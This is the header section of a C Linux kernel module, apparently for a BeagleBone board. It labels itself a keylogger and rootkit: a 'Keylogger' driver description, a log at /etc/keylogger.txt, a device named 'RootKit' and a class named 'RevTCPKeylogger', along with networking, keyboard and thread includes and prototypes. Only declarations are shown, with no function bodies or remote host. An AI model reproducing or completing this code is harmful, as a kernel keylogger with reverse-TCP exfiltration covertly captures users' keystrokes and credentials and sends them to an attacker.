#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mutex.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/ioport.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <linux/version.h>
#include <linux/ioctl.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/kernel.h>
#include <linux/kthread.h>  // for threads
#include <linux/time.h>   // for using jiffies 
#include <linux/timer.h>
#include <linux/kmod.h>         
#include <linux/string.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/file.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include "reverseTCP_ioctl.h"

#define DRIVER_DESC     "Keylogger"
#define fullFileName    "/etc/keylogger.txt"

#define CQ_DEFAULT	0

#define  DEVICE_NAME "RootKit"
#define  CLASS_NAME  "RevTCPKeylogger"         
 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pon Stars");
MODULE_DESCRIPTION("Linux device driver...");
MODULE_VERSION("1.0");

//define listing for the LEDs to turn on // NO NEED?
#define GPIO1_START_ADDR 0x4804C000
#define GPIO1_END_ADDR   0x4804e000
#define GPIO1_SIZE (GPIO1_END_ADDR - GPIO1_START_ADDR)

#define GPIO_SETDATAOUT 0x194
#define GPIO_CLEARDATAOUT 0x190
#define USR3 (1<<24)
#define USR0 (1<<21)

#define USR_LED USR0
#define LED0_PATH "/sys/class/leds/beaglebone:green:usr0"
#define TIMING 250



void BBBremoveTrigger(void);
void BBBstartHeartbeat(void);
void BBBledOn(void);
void BBBledOff(void);

//LED func and others
ssize_t write_vaddr_disk(void *, size_t);
int setup_disk(void);
void cleanup_disk(void);
static void disable_dio(void);

char * mcodestring(int asciicode);

static struct file * f = NULL;
static int reopen = 0;
static char *filepath = 0;
static int dio = 0;

// threads functions
int thread_fn(void *); 
void thread_cleanup(void);
int thread_init (void);
